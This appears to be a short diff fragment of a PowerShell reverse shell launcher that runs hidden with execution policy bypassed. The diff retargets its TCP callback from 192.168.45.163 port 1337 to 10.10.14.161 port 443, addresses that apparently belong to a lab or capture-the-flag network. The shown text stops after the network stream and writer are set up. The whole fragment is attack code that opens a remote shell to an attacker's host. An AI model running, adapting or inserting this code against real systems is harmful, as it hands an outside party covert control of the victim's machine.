@@ -1,5 +1,5 @@
 powershell.exe -nop -W hidden -non -ep bypass -c "
-$TCPClient = New-Object Net.Sockets.TCPClient('192.168.45.163', 1337);
+$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.161', 443);
 $NetworkStream = $TCPClient.GetStream();
 $StreamWriter = New-Object IO.StreamWriter($NetworkStream);
 
